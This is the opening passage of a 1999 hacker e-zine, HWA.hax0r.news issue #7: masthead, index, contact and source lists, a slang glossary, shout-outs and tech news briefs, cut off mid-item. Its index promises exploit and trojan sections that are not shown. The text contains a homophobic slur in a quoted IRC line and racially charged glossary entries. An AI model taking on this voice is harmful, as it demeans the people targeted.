@@ -1,0 +1,2965 @@
+    [ 28 63 29 20 31 39 39 39 20 63 72 75 63 69 70 68 75 78 20 68 77 61 ]
+  =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=
+  ==========================================================================
+  =                     <=-[ HWA.hax0r.news ]-=>                           =
+  ==========================================================================
+    [=HWA'99=]                         Number 7 Volume 1 1999 Feb 20th 99
+  ==========================================================================
+
+
+   "I got the teenage depression, thats all i'm talkin about, if you dunno
+     what i mean then you better look out, look out!" 
+                                      
+                                            - Eddie & The Hotrods
+     
+   
+   Synopsis
+   --------     
+   
+   The purpose of this newsletter is to 'digest' current events of interest
+   that affect the online underground and netizens in general. This includes
+   coverage of general security issues, hacks, exploits, underground news
+   and anything else I think is worthy of a look see.
+
+    This list is NOT meant as a replacement for, nor to compete with, the
+   likes of publications such as CuD or PHRACK or with news sites such as
+   AntiOnline, the Hacker News Network (HNN) or mailing lists such as
+   BUGTRAQ or ISN nor could any other 'digest' of this type do so.
+
+    It *is* intended  however, to  compliment such material and provide a
+   reference to those who follow the culture by keeping tabs on as many
+   sources as possible and providing links to further info, its a labour
+   of love and will be continued for as long as I feel like it, i'm not
+   motivated by dollars or the illusion of fame, did you ever notice how
+   the most famous/infamous hackers are the ones that get caught? there's
+   a lot to be said for remaining just outside the circle... <g>
+
+
+   @HWA
+   
+   =-----------------------------------------------------------------------= 
+  
+                     Welcome to HWA.hax0r.news ... #7 
+                     
+   =-----------------------------------------------------------------------=                      
+                     
+          "I dunno what i'm doing, but i'm damn good at it" 
+                     
+                                    - Seen on a button worn by ed..                  
+    
+    
+    *******************************************************************    
+    ***      /join #HWA.hax0r.news on EFnet the key is `zwen'       ***
+    ***                                                             ***
+    *** please join to discuss or impart news on techno/phac scene  ***
+    *** stuff or just to hang out ... someone is usually around 24/7***
+    *******************************************************************
+                                             
+                         
+  =-------------------------------------------------------------------------= 
+   
+  Issue #7 little endian release, Feb 20th 1999        Don't be happy, worry.
+  
+  
+  =--------------------------------------------------------------------------= 
+  
+  inet.d THIS b1lly the llammah 
+  
+  ________ ------- ___________________________________________________________
+ |\____\_/[ INDEX ]__________________________________________________________/|         
+ | |                                                                         ||
+ | | Key     Content                                                         ||
+  \|_________________________________________________________________________/    
+  
+   00.0  .. COPYRIGHTS 
+   00.1  .. CONTACT INFORMATION & SNAIL MAIL DROP ETC
+   00.2  .. SOURCES        
+   00.3  .. THIS IS WHO WE ARE
+   00.4  .. WHAT'S IN A NAME? why `HWA.hax0r.news'?
+   00.5  .. THE HWA_FAQ V1.0 
+    
+   \__________________________________________________________________________/
+    
+   01.0  .. Greets
+   01.1  .. Last minute stuff, rumours, newsbytes, mailbag
+   02.0  .. From the editor
+   03.0  .. Army Signal Command protecting networks from hackers   
+   04.0  .. France plays leapfrog with US over crypto laws..     
+   05.0  .. More kewl poetry from Phiregod
+   06.0  .. ISP cracks User's machine then threatens legal action on THEM
+   07.0  .. l0pht releases new NT admin exploit (and patch)
+   07.1  .. Hackers Get Their Final Fantasy
+   08.0  .. dcc yerself some r00t
+   09.0  .. Cyrix bug crashes cpus
+   10.0  .. Intel's id on a chip is more than it may seem
+   11.0  .. Security Snake Oil (From CryptoGram)
+   12.0  .. The Hacker Challenge (Reprint from HNN w/permission) by Qubik
+   13.0  .. Trojans have come a long way, heres one in basic for some fun.
+   
+   AD.S  .. Post your site ads or etc here, if you can offer something in return
+            thats tres cool, if not we'll consider ur ad anyways so send it in.
+    
+    H.W  .. Hacked Websites www.l0pht.com and www.hackernews.com hacked??   
+    A.0  .. APPENDICES  
+    A.1  .. PHACVW linx and references 
+  ____________________________________________________________________________
+ |\__________________________________________________________________________/|
+ | |                                                                         ||
+ | |                                                                         ||
+ | |    The name Linus means "flaxen-haired" and is of Greek origin ...- Ed  ||
+ | |                                                                         ||
+ | |                                                                         ||
+ | |     "Shouting the loudest does not make you right or true" - FP         ||  
+ | |                                                                         ||
+  \|_________________________________________________________________________|/
+       
+
+     @HWA'99                 
+     
+     
+  
+         
+  00.0  (C) COPYRIGHT, (K)OPYWRONG, COPYLEFT? V2.0
+        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+     
+     THE OPINIONS OF THE WRITERS DO NOT NECESSARILY REFLECT THE
+     OPINIONS OF THE PUBLISHERS AND VICE VERSA IN FACT WE DUNNO
+     WTF IS GONNA TAKE RESPONSIBILITY FOR THIS, I'M NOT DOING IT
+     (LOTS OF ME EITHER'S RESOUND IN THE BACKGROUND) SO UHM JUST
+     READ IT AND IF IT BUGS YOU WELL TFS (SEE FAQ).
+     
+     Important semi-legalese and license to redistribute:
+     
+     YOU MAY DISTRIBUTE THIS ZINE WITHOUT PERMISSION FROM MYSELF 
+     AND ARE GRANTED THE RIGHT TO QUOTE ME OR THE CONTENTS OF THE
+     ZINE SO LONG AS Cruciphux AND/OR HWA.hax0r.news ARE MENTIONED 
+     IN YOUR WRITING. LINK'S ARE NOT NECESSARY OR EXPECTED BUT ARE 
+     APPRECIATED the current link is http://welcome.to/HWA.hax0r.news
+     IT IS NOT MY INTENTION TO VIOLATE ANYONE'S COPYRIGHTS OR BREAK
+     ANY NETIQUETTE IN ANY WAY IF YOU FEEL I'VE DONE THAT PLEASE EMAIL
+     ME PRIVATELY current email cruciphux@dok.org 
+     
+     THIS DOES NOT CONSTITUTE ANY LEGAL RIGHTS, IN THIS COUNTRY ALL
+     WORKS ARE (C) AS SOON AS COMMITTED TO PAPER OR DISK, IF ORIGINAL
+     THE LAYOUT AND COMMENTARIES ARE THEREFORE (C) WHICH MEANS:
+     
+     I RETAIN ALL RIGHTS, BUT I GIVE YOU THE RIGHT TO READ, QUOTE
+     AND REDISTRIBUTE/MIRROR. - EoD
+   
+    
+     Although this file and all future issues are now copyright, some of
+    the content holds its  own copyright and these are printed and 
+    respected. News is news so i'll print any and all news but will quote 
+    sources when the source is known, if its good enough for CNN its good
+    enough for me. And i'm doing it for free on my own time so pfffft. :) 
+    
+    No monies are made or sought through the distribution of this material.
+    If you have a problem or concern email me and we'll discuss it.
+    
+    cruciphux@dok.org
+    
+    Cruciphux [C*:.]
+
+      
+     
+  00.1  CONTACT INFORMATION AND MAIL DROP
+        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+       
+       Has it occurred to anybody that "AOL for Dummies" is an extremely
+       redundant name for a book? 
+                                      - unknown
+       
+           
+     Wahoo, we now have a mail-drop, if you are outside of the U.S.A or 
+    Canada / North America (hell even if you are inside ..) and wish to
+    send printed matter like newspaper clippings a subscription to your
+    cool foreign hacking zine or photos, small non-explosive packages
+    or sensitive information etc etc well, now you can. (w00t) please
+    no more inflatable sheep or plastic dog droppings, or fake vomit
+    thanks.
+    
+    Send all goodies to:
+    
+	    HWA NEWS
+	    P.O BOX 44118
+	    370 MAIN ST. NORTH
+	    BRAMPTON, ONTARIO
+	    CANADA
+	    L6V 4H5
+	    
+    Ideas for interesting 'stuff' to send in apart from news:
+    
+    - Photo copies of old system manual front pages (optionally signed by you) ;-)
+    - Photos of yourself, your mom, sister, dog and or cat in a NON
+      compromising position plz I don't want pr0n. <g>
+    - Picture postcards
+    - CD's 3.5" disks, Zip disks, 5.25" or 8" floppies, Qic40/80/100-250
+      tapes with hack/security related archives, logs, irc logs etc on em.
+    - audio or video cassettes of yourself/others etc of interesting phone
+      fun or social engineering examples or transcripts thereof.
+    
+    If you still can't think of anything you're probably not that interesting
+    a person after all so don't worry about it <BeG>  
+    
+    Our current email:
+    
+    Submissions/zine gossip.....: hwa@press.usmc.net
+    Private email to editor.....: cruciphux@dok.org
+    Distribution/Website........: sas72@usa.net
+
+    @HWA
+
+           
+    
+  00.2  Sources ***
+        ~~~~~~~~~~~     
+
+     Sources can be some, all, or none of the following (by no means complete
+    nor listed in any degree of importance) Unless otherwise noted, like msgs
+    from lists or news from other sites, articles and information is compiled
+    and or sourced by Cruciphux no copyright claimed.
+
+    HiR:Hackers Information Report... http://axon.jccc.net/hir/
+    News & I/O zine ................. http://www.antionline.com/
+   *News/Hacker site................. http://www.bikkel.com/~demoniz/ *DOWN!*
+    News (New site unconfirmed).......http://cnewz98.hypermart.net/
+    Back Orifice/cDc..................http://www.cultdeadcow.com/
+    News site (HNN) .....,............http://www.hackernews.com/
+    Help Net Security.................http://net-security.org/  
+    News,Advisories,++ ...............http://www.l0pht.com/
+    NewsTrolls (HNN)..................http://www.newstrolls.com/
+    News + Exploit archive ...........http://www.rootshell.com/beta/news.html
+    CuD ..............................http://www.soci.niu.edu/~cudigest
+    News site+........................http://www.zdnet.com/
+
+    +Various mailing lists and some newsgroups, such as ...
+    +other sites available on the HNN affiliates page, please see
+     http://www.hackernews.com/affiliates.html as they seem to be popping up
+     rather frequently ...
+
+    * Yes demoniz is now officially retired, if you go to that site though the
+     Bikkel web board (as of this writing) is STILL ACTIVE, www.hwa-iwa.org will
+     also be hosting a webboard as soon as that site comes online perhaps you can
+     visit it and check us out if I can get some decent wwwboard code running I
+     don't really want to write my own, another alternative being considered is a
+     telnet bbs that will be semi-open to all, you will be kept posted. - cruciphux
+    
+    http://www.the-project.org/ .. IRC list/admin archives
+    http://www.anchordesk.com/  .. Jesse Berst's AnchorDesk
+    
+    alt.hackers.malicious
+    alt.hackers
+    alt.2600
+    BUGTRAQ
+    ISN security mailing list
+    ntbugtraq
+    <+others>
+
+    NEWS Agencies, News search engines etc:
+    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    http://www.cnn.com/SEARCH/
+    http://www.foxnews.com/search/cgi-bin/search.cgi?query=cracker&days=0&wires=0&startwire=0
+    http://www.news.com/Searching/Results/1,18,1,00.html?querystr=cracker
+    http://www.ottawacitizen.com/business/
+    http://search.yahoo.com.sg/search/news_sg?p=cracker
+    http://www.washingtonpost.com/cgi-bin/search?DB_NAME=WPlate&TOTAL_HITLIST=20&DEFAULT_OPERATOR=AND&headline=&WITHIN_FIELD_NAME=.lt.event_date&WITHIN_DAYS=0&description=cracker
+    http://www.zdnet.com/zdtv/cybercrime/
+    http://www.zdnet.com/zdtv/cybercrime/chaostheory/ (Kevin Poulsen's Column)
+
+    NOTE: See appendices for details on other links.
+    
+    Referenced news links
+    ~~~~~~~~~~~~~~~~~~~~~
+       
+    http://news.bbc.co.uk/hi/english/sci/tech/newsid_254000/254236.stm
+    http://freespeech.org/eua/ Electronic Underground Affiliation
+    http://www.l0pht.com/cyberul.html     
+    http://www.hackernews.com/archive.html?122998.html
+    http://ech0.cjb.net ech0 Security
+    http://net-security.org Net Security  
+
+    ...
+    
+    
+    Submissions/Hints/Tips/Etc
+    ~~~~~~~~~~~~~~~~~~~~~~~~~~
+    
+             "silly faggot, dix are for chix" 
+             
+                                     - from irc ... by unknown ;-)
+    
+    
+    All submissions that are `published' are printed with the credits
+    you provide, if no response is received by a week or two it is assumed
+    that you don't care wether the article/email is to be used in an issue
+    or not and may be used at my discretion.
+    
+    Looking for:
+    
+    Good news sites that are not already listed here OR on the HNN affiliates
+    page at http://www.hackernews.com/affiliates.html
+    
+    Magazines (complete or just the articles) of breaking sekurity or hacker
+    activity in your region, this includes telephone phraud and any other
+    technological use, abuse hole or cool thingy. ;-) cut em out and send it
+    to the drop box.
+    
+    
+    - Ed
+    
+    Mailing List Subscription Info   (Far from complete)         Feb 1999
+    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~   ~~~~~~~~~~~~~~~~~~~         ~~~~~~~~	
+        
+    ISS Security mailing list faq : http://www.iss.net/iss/maillist.html
+    
+    
+    THE MOST READ:
+    
+    BUGTRAQ - Subscription info
+    ~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    
+    What is Bugtraq?     
+
+    Bugtraq is a full-disclosure UNIX security mailing list, (see the info
+    file) started by Scott Chasin <chasin@crimelab.com>. To subscribe to 
+    bugtraq, send mail to listserv@netspace.org containing the message body
+    subscribe bugtraq. I've been archiving this list on the web since late 
+    1993. It is searchable with glimpse and archived on-the-fly with hypermail.
+    
+    Searchable Hypermail Index;
+         
+          http://www.eecs.nwu.edu/~jmyers/bugtraq/index.html
+    
+    
+        
+    About the Bugtraq mailing list
+    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    
+    The following comes from Bugtraq's info file: 
+
+    This list is for *detailed* discussion of UNIX security holes: what they are,
+    how to exploit, and what to do to fix them. 
+
+    This list is not intended to be about cracking systems or exploiting their 
+    vulnerabilities. It is about defining, recognizing, and preventing use of 
+    security holes and risks. 
+
+    Please refrain from posting one-line messages or messages that do not contain
+    any substance that can relate to this list`s charter. 
+
+    I will allow certain informational posts regarding updates to security tools,
+    documents, etc. But I will not tolerate any unnecessary or nonessential "noise"
+    on this list. 
+
+    Please follow the below guidelines on what kind of information should be posted
+    to the Bugtraq list: 
+
+    + Information on Unix related security holes/backdoors (past and present) 
+    + Exploit programs, scripts or detailed processes about the above 
+    + Patches, workarounds, fixes 
+    + Announcements, advisories or warnings 
+    + Ideas, future plans or current works dealing with Unix security 
+    + Information material regarding vendor contacts and procedures 
+    + Individual experiences in dealing with above vendors or security organizations 
+    + Incident advisories or informational reporting 
+
+    Any non-essential replies should not be directed to the list but to the originator of the message. Please do not "CC" the bugtraq
+    reflector address if the response does not meet the above criteria. 
+
+    Remember: YOYOW. 
+
+    You own your own words. This means that you are responsible for the words that you post on this list and that reproduction of
+    those words without your permission in any medium outside the distribution of this list may be challenged by you, the author. 
+
+    For questions or comments, please mail me: 
+    chasin@crimelab.com (Scott Chasin) 
+
+    
+    BEST-OF-SECURITY Subscription Info.
+    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+           
+    
+                    _/_/_/          _/_/          _/_/_/
+                   _/    _/      _/    _/      _/
+                  _/_/_/        _/    _/        _/_/
+                 _/    _/      _/    _/            _/
+                _/_/_/          _/_/        _/_/_/
+
+                Best            Of          Security
+
+    "echo subscribe|mail best-of-security-request@suburbia.net"
+
+                                or
+
+    "echo subscribe|mail best-of-security-request-d@suburbia.net"
+
+                          (weekly digest)
+
+    For those of you that just don't get the above, try sending a message to
+    best-of-security-request@suburbia.net with a subject and body of subscribe
+    and you will get added to the list (maybe, if the admin likes your email).  
+    
+    Crypto-Gram
+    ~~~~~~~~~~~
+    
+       CRYPTO-GRAM is a free monthly newsletter providing summaries, analyses,
+      insights, and commentaries on cryptography and computer security.
+
+      To subscribe, visit http://www.counterpane.com/crypto-gram.html or send a
+      blank message to crypto-gram-subscribe@chaparraltree.com.  To unsubscribe,
+      visit http://www.counterpane.com/unsubform.html.  Back issues are available
+      on http://www.counterpane.com.
+      
+       CRYPTO-GRAM is written by Bruce Schneier.  Schneier is president of
+      Counterpane Systems, the author of "Applied Cryptography," and an inventor
+      of the Blowfish, Twofish, and Yarrow algorithms.  He served on the board of
+      the International Association for Cryptologic Research, EPIC, and VTW.  He
+      is a frequent writer and lecturer on cryptography.
+  
+
+    CUD Computer Underground Digest
+    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    This info directly from their latest ish:
+    
+    Computer underground Digest    Sun  14 Feb, 1999   Volume 11 : Issue 09
+     
+                      ISSN  1004-042X
+
+       Editor: Jim Thomas (cudigest@sun.soci.niu.edu)
+       News Editor: Gordon Meyer (gmeyer@sun.soci.niu.edu)
+       Archivist: Brendan Kehoe
+       Poof Reader:   Etaion Shrdlu, Jr.
+       Shadow-Archivists: Dan Carosone / Paul Southworth
+                          Ralph Sims / Jyrki Kuoppala
+                          Ian Dickinson
+       Cu Digest Homepage: http://www.soci.niu.edu/~cudigest
+
+    
+
+    [ISN] Security list
+    ~~~~~~~~~~~~~~~~~~~
+    This is a low volume list with lots of informative articles, if I had my
+    way i'd reproduce them ALL here, well almost all .... ;-) - Ed
+    
+    
+    Subscribe: mail majordomo@repsec.com with "subscribe isn".
+
+
+
+    @HWA
+    
+     
+  00.3  THIS IS WHO WE ARE 
+        ~~~~~~~~~~~~~~~~~~
+      
+      'A "thug" was once the name for a ritual strangler, and is taken from
+       the Hindu word Thag... ' - Ed
+      
+      
+      Some HWA members and Legacy staff
+      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    
+      cruciphux@dok.org.........: currently active/editorial
+      darkshadez@ThePentagon.com: currently active/man in black
+      fprophet@dok.org..........: currently active/IRC+ man in black
+      sas72@usa.net ............. currently active/IRC+ distribution
+      vexxation@usa.net ........: currently active/IRC+ proof reader/grrl in black
+      dicentra...(email withheld): IRC+ grrl in black
+      
+      
+      Foreign Correspondants/affiliate members
+      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+      ATTENTION: All foreign correspondants please check in or be removed by next
+      issue  I need  your current emails since contact info was recently lost in a 
+      HD mishap and i'm not carrying any deadweight. Plus we need more people sending
+      in info, my apologies for not getting back to you if you sent in January I lost
+      it, please resend. 
+      
+      
+               
+       N0Portz ..........................: Australia      
+       Qubik ............................: United Kingdom 
+       system error .....................: Indonesia      
+       Wile (wile coyote) ...............: Japan/the East 
+       Ruffneck  ........................: Netherlands/Holland
+       
+       And unofficially yet contributing too much to ignore ;)
+       
+       Spikeman .........................: World media 
+       
+       Please send in your sites for inclusion here if you haven't already
+       also if you want your emails listed send me a note ... - Ed
+       
+      http://www.genocide2600.com/~spikeman/  .. Spikeman's DoS and protection site
+        
+       
+     Contributors to this issue:
+     ~~~~~~~~~~~~~~~~~~~~~~~~~~~
+       liquid phire......................: underground prose
+     
+       Qubik ............................: Hacking in Germany+     
+     
+       Spikeman .........................: daily news updates+       
+     
+       *******************************************************************    
+       ***      /join #HWA.hax0r.news on EFnet the key is `zwen'       ***
+       *******************************************************************
+    
+    :-p  
+    
+    
+    1. We do NOT work for the government in any shape or form.Unless you count paying
+       taxes ... in which case we work for the gov't in a BIG WAY. :-/
+     
+    2. MOSTLY Unchanged since issue #1, although issues are a digest of recent news
+       events its a good idea to check out issue #1 at least and possibly also the
+       Xmas issue for a good feel of what we're all about otherwise enjoy - Ed ...
+        
+    
+    @HWA
+    
+    
+
+  00.4  Whats in a name? why HWA.hax0r.news??
+        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+     
+      Well what does HWA stand for? never mind if you ever find out I may
+     have to get those hax0rs from 'Hackers' or the Pretorians after you.
+     
+     In case you couldn't figure it out hax0r is "new skewl" and although
+     it is laughed at, shunned, or even pidgeon holed with those 'dumb
+     leet (l33t?) dewds' <see article in issue #4> this is the state
+     of affairs. It ain't Stephen Levy's HACKERS anymore. BTW to all you 
+     up  and comers, i'd highly recommend you get that book. Its almost 
+     like  buying a clue. Anyway..on with the show .. - Editorial staff
+     
+
+   
+
+  00.5  HWA FAQ v1.0 Feb 13th 1999 (Abridged & slightly updated again)
+        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+       
+    Also released in issue #3. (revised) check that issue for the faq
+    it won't be reprinted unless changed in a big way with the exception
+    of the following excerpt from the FAQ, included to assist first time
+    readers:
+
+    Some of the stuff related to personal useage and use in this zine are
+    listed below: Some are very useful, others attempt to deny the any possible
+    attempts at eschewing obfuscation by obsucuring their actual definitions.
+    
+    @HWA   - see EoA  ;-)
+    
+    !=     - Mathematical notation "is not equal to" or "does not equal"
+             ASC(247)  "wavey equals" sign means "almost equal" to. If written
+             an =/= (equals sign with a slash thru it) also means !=, =< is Equal
+             to or less than and =>  is equal to or greater than (etc, this aint 
+             fucking grade school, cripes, don't believe I just typed all that..)      
+             
+    AAM    - Ask a minor (someone under age of adulthood, usually <16, <18 or <21)
+    
+    AOL    - A great deal of people that got ripped off for net access by a huge
+             clueless isp with sekurity that you can drive buses through, we're
+             not talking Kung-Fu being none too good here, Buy-A-Kloo maybe at the
+             least they could try leasing one??
+             
+   *CC     - 1 - Credit Card (as in phraud)
+             2 - .cc is COCOS (Keeling) ISLANDS butthey probably accept cc's
+    
+    CCC    - Chaos Computer Club (Germany)               
+    
+   *CON    - Conference, a place hackers crackers and hax0rs among others go to swap
+             ideas, get drunk, swap new mad inphoz, get drunk, swap gear, get drunk
+             watch videos and seminars, get drunk, listen to speakers, and last but
+             not least, get drunk.
+   *CRACKER - 1 . Someone who cracks games, encryption or codes, in popular hacker
+                 speak he's the guy that breaks into systems and is often (but by no
+                 means always) a "script kiddie" see pheer
+              2 . An edible biscuit usually crappy tasting without a nice dip, I like
+                  jalapeno pepper dip or chives sour cream and onion, yum - Ed
+    
+    Ebonics - speaking like a rastafarian or hip dude of colour <sic> also wigger
+              Vanilla Ice is a wigger, The Beastie Boys and rappers speak using
+              ebonics, speaking in a dark tongue ... being ereet, see pheer
+                              
+    EoC    - End of Commentary
+    
+    EoA    - End of Article or more commonly @HWA
+    
+    EoF    - End of file
+    
+    EoD    - End of diatribe (AOL'ers: look it up)
+    
+    FUD    - Coined by Unknown and made famous by HNN <g> - "Fear uncertainty and doubt",
+            usually in general media articles not high brow articles such as ours or other
+            HNN affiliates ;)
+            
+    du0d   - a small furry animal that scurries over keyboards causing people to type
+             wierd crap on irc, hence when someone says something stupid or off topic
+             'du0d wtf are you talkin about' may be used.        
+            
+   *HACKER - Read Stephen Levy's HACKERS for the true definition, then see HAX0R
+            
+   *HAX0R - 1 - Cracker, hacker wannabe, in some cases a true hacker, this is difficult to
+            define, I think it is best defined as pop culture's view on The Hacker ala
+            movies such as well erhm "Hackers" and The Net etc... usually used by "real"
+            hackers or crackers in a derogatory or slang humorous way, like 'hax0r me 
+            some coffee?' or can you hax0r some bread on the way to the table please?'          
+            
+            2 - A tool for cutting sheet metal.
+            
+    HHN    - Maybe a bit confusing with HNN but we did spring to life around the same
+             time too, HWA Hax0r News.... HHN is a part of HNN .. and HNN as a proper
+             noun means the hackernews site proper. k? k. ;&
+             
+    HNN    - Hacker News Network and its affiliates http://www.hackernews.com/affiliates.html       
+    
+    J00    - "you"(as in j00 are OWN3D du0d) - see 0wn3d 
+    
+    MFI/MOI- Missing on/from IRC
+    
+    NFC   - Depends on context: No Further Comment or No Fucking Comment
+    
+    NFR   - Network Flight Recorder (Do a websearch) see 0wn3d
+    
+    NFW   - No fuckin'way 
+    
+   *0WN3D - You are cracked and owned by an elite entity see pheer 
+   *OFCS  - Oh for christ's sakes
+       
+    PHACV - And variations of same <coff> 
+            Phreaking, Hacking, Anarchy, Cracking, Carding (CC) Groups Virus, Warfare
+          
+          Alternates: H - hacking, hacktivist
+                      C - Cracking <software>
+                      C - Cracking <systems hacking>
+                      V - Virus 
+                      W - Warfare <cyberwarfare usually as in Jihad>
+                     CT - Cyber Terrorism
+   
+   *PHEER -  This is what you do when an ereet or elite person is in your presence
+            see 0wn3d 
+                       
+   *RTFM  - Read the fucking manual - not always applicable since some manuals are
+            pure shit but if the answer you seek is indeed in the manual then you
+            should have RTFM you dumb ass.
+    
+    TBC   - To Be Continued also 2bc (usually followed by ellipses...) :^0
+    
+    TBA   - To Be Arranged/To Be Announced also 2ba
+    
+    TFS   - Tough fucking shit.
+    
+   *w00t  - 1 - Reserved for the uber ereet, noone can say this without severe repercussions
+            from the underground masses. also "w00ten" <sic>
+            
+            2 - Cruciphux and sAs72's second favourite word (they're both shit stirrers)
+            
+    *wtf  - what the fuck       
+    
+    *ZEN  - The state you reach when you *think* you know everything (but really don't)
+            usually shortly after reaching the ZEN like state something will break that
+            you just 'fixed' or tweaked.
+        
+  01.0  Greets!?!?! yeah greets! w0w huh. - Ed
+        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+     
+     Thanks to all in the community for their support and interest but i'd
+     like to see more reader input, help me out here, whats good, what sucks
+     etc, not that I guarantee i'll take any notice mind you, but send in 
+     your thoughts anyway.
+     
+     
+     Shouts to:
+
+       * Kevin Mitnick       * demoniz          * The l0pht crew
+       * tattooman           * Dicentra         * Pyra          
+       * Vexxation           * FProphet         * TwistedP      
+       * NeMstah             * the readers      * mj
+       * Kokey               * ypwitch          * kimmie
+       * k-os                * gphoe            * YOU.
+       
+       * #leetchans ppl, you know who you are...
+         
+     
+       * all the people who sent in cool emails and support
+       * our new 'staff' members.
+     
+  
+     kewl sites:
+     
+     + http://www.freshmeat.net/
+     + http://www.slashdot.org/
+     + http://www.l0pht.com/
+     + http://www.2600.com/
+     + http://hacknews.bikkel.com/ (http://www.bikkel.com/~demoniz/)
+     + http://www.legions.org/
+     + http://www.genocide2600.com/      
+     + http://www.genocide2600.com/~spikeman/
+     + http://www.genocide2600.com/~tattooman/     
+     + http://www.hackernews.com/ (Went online same time we started issue 1!)          
+   
+     @HWA
+     
+
+  01.1  Last minute stuff, rumours and newsbytes
+        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+       
+       "What is popular isn't always right, and what is right isn't
+         always popular..." 
+                           - FProphet '99
+
+    +++ When was the last time you backed up your important data?    
+        
+     ++ AT&T-TCI merger faces deadline
+        Contributed by sAs72 source: ZDNet
+
+        The fate of AT&T's multibillion-dollar merger with TCI will soon
+        be decided. City commissions in Seattle and other municipalities
+        have put up a good fight over cable open access, but must vote
+        today on whether to approve or deny the deal, along with the
+        transfer of cable licenses in their areas.
+        http://www.news.com/News/Item/0%2C4%2C32441%2C00.html?dd.ne.txt.0216.02
+
+    ++  Intel drives low-cost cable modems
+
+        High-speed cable modems may become cheaper in the near future
+        as a result of an Intel initiative now coming to light.  Intel is
+        working with Libit Signal Processing and possibly other partners
+        to produce a futuristic breed of devices called "host-based" cable
+        modems.  News.com explains how these devices work.
+        http://www.news.com/News/Item/0%2C4%2C32406%2C00.html?dd.ne.txt.0216.03
+
+    ++  Boycott pressure in full force
+
+        Critics of Intel's new chip technology are trying to widen a boycott
+        and enlist the government to take a stand against the Pentium III
+        processor which the critics say can trace where users have been
+        on the Internet.  Will they succeed before the February 26 release date?
+        http://www.news.com/News/Item/0%2C4%2C32410%2C00.html?dd.ne.txt.0216.04
+
+    ++  ABOUT THOSE FREE IMACS ... (BUS. 10:00 am)
+        http://www.wired.com/news/news/email/explode-infobeat/business/story/17961.html
+
+        Before you sign up for the iMac giveaway that One Stop
+        Communications is hawking, you might want to check out the
+        company founder's checkered history. By Craig Bicknell.
+           . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+
+    ++   BIG BLUE DOES DIGITAL BROADCAST (TECH. 9:30 am)
+         http://www.wired.com/news/news/email/explode-infobeat/technology/story/17960.html
+
+         The computer giant said it will team up with five companies
+         to secure digitally broadcast content... Also: Owners of the
+         mighty Rio MP3 player can now dress up the device.
+           . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+
+    ++ AT&T OWNERS BACK TCI DEAL (BUS. 7:40 am)
+       http://www.wired.com/news/news/email/explode-infobeat/business/story/17954.html
+
+       The merger of the phone giant and the cable company easily
+       clears another barrier.
+ 
+
+    ++ BELLSOUTH, 3COM GET SPEEDY (TECH. 7:40 am)
+       http://www.wired.com/news/news/email/explode-infobeat/technology/story/17956.html
+
+       The phone company wants to make digital subscriber lines
+       accessible in the South, so it'll offer 3Com modems and
+       joint sales, online and off.
+         
+
+    ++ CHIPS AHOY (TECH. 3:00 am)
+       http://www.wired.com/news/news/email/explode-infobeat/technology/story/17952.html
+
+       Sony unveils its new PlayStation super-chip and wows an
+       annual gathering of leading processor designers. Leander
+       Kahney reports from San Francisco.
+         
+
+
+    ++ THE MOST WIRED NATION ON EARTH (BUS. 3:00 am)
+       http://www.wired.com/news/news/email/explode-infobeat/business/story/17948.html
+
+       Canada's finance minister announces a four-year C$1.8 billion
+       spending plan to connect every corner of the
+       northern nation.
+         
+    ++ EFF APPOINTS NEW DIRECTOR (POL. Tuesday)
+       http://www.wired.com/news/news/email/explode-infobeat/politics/story/17941.html
+
+       With one foot in Silicon Valley and one on Capitol Hill, Tara
+       Lemmey will lead the Electronic Frontier Foundation into the
+       next millennium. Observers are beaming. By James Glave.
+       
+    ++   CRISPER, CHEAPER PIX OF EARTH (TECH. Tuesday)
+       http://www.wired.com/news/news/email/explode-infobeat/technology/story/17936.html
+       The burgeoning market for satellite images of the world is
+       driving the need for affordable software to process them.
+       Enter a new open-source project that does just that. By
+       Chris Oakes.
+           
+
+    ++   UPSCALE ONLINE AUCTIONING (BUS. Tuesday)
+         http://www.wired.com/news/news/email/explode-infobeat/business/story/17940.html
+         Sotheby's ups the ante of online auctioning. The exclusive
+         auction house has signed over 1,000 art dealers to sell
+         merchandise on its new site.
+          
+
+    ++   COMPAQ BUYS ZIP2 (BUS. Tuesday)
+         http://www.wired.com/news/news/email/explode-infobeat/business/story/17939.html
+         The PC maker buys the online-publishing software vendor to
+         beef up AltaVista. Also: Drugstore.com lands on AOL,
+         Excite.... ETrade to sell own mutual funds.... And more.
+
+     ++ Snarfed by sAs- contributed by erehwon (HNN)
+        Feb 19th'99
+        The National Police Agency of Japan has said that high-tech
+        crime has risen 58% in the country over the last year. They said
+        there where 415 cases categorized as high-tech crimes in 1998,
+        compared to 262 in 1997. Computer-related fraud included forging
+        bank account data and reprogramming electromagnetic data. 
+
+        Detriot News ............http://deseretnews.com/dn/view/0,1249,30011968,00.html?
+        San Jose Mecury News.....http://www.sjmercury.com/breaking/docs/015380.html
+        Nando Times..............http://www.techserver.com/story/body/0,1634,19705-32364-235694-0,00.html
+
+
+     ++  Scanners illegal 
+         Contributed by sw3 Source: Innerpulse News Network at csoft.net
+         Wednesday - February 10, 1999. 05:05PM UTC 
+         Reported today on HNN; the Wireless Privacy Enhacement Act of 1999
+         has been entered into the US House of Representatives by Rep. Heather
+         Wilson. That would make illegal devices that can receive or decode personal
+         radio communication such as police bands, cellular phones, pagers; such as
+         scanners. (luckily us ham types and tech types know so many ways around this
